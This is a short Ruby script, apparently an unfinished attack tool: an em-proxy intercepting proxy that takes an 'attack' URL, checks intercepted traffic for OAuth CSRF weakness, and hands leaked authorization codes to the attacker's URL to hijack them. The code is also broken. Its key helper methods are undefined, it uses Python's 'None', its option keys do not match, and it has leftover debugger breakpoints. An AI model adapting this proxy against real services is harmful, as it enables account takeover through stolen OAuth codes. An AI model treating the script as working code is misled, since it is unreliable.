#!/usr/bin/env ruby

require 'em-proxy'
require 'optparse'
require 'pry'

class Proxy
  def parse_options
    options = {}

    OptionParser.new do |opts|
      opts.banner = "Usage: #{File.basename($0)} [options]"
      opts.separator ""

      opts.on("-a", "--attack HOST", "Set the attack url") do |a|
        options[:attack] = a
      end

      opts.on("-h", "--host HOST", "Set the IP of proxy host") do |h|
        options[:host] = h
      end

      opts.on("-p", "--host-port", "Set the port of proxy host") do |p|
        options[:host_port] = p.to_i
      end

      opts.on("-t", "--target", "Set the IP of proxy target") do |t|
        options[:target] = t
      end

      opts.on("-q", "--target-port", "Set the port of proxy target") do |q|
        options[:target_port] = q.to_i
      end
    end.parse!

    options
  end

  def start_proxy
    Proxy.start(:host => @host, :port => @hport, :debug => false) do |conn|
      conn.server :srv, :host => @target, :port => @tport 
    
      conn.on_data do |data|
        binding.pry
        csrf_vulnerable(check_state(data))
        p [:on_data, data]
        data
      end
    
      conn.on_response do |backend, resp|
        binding.pry
        if leaks_auth_code(resp)
          hijack_leaky_auth_code(@target + @tport.to_s, @attack_url)
        end
        p [:on_response, backend, resp]
        resp
      end
    
      conn.on_finish do |backend, name|
        p [:on_finish, name]
        unbind if backend == :srv
      end
    end
  end
  
  def initialize(host=None, hport=None, target=None, tport=None, attack=None)
    @options = parse_options

    @host = host || @options[:host]
    @hport = hport || @options[:hport]
    @target = target || @options[:target]
    @tport = tport || @options[:tport]
    @attack_url = attack
  end
end
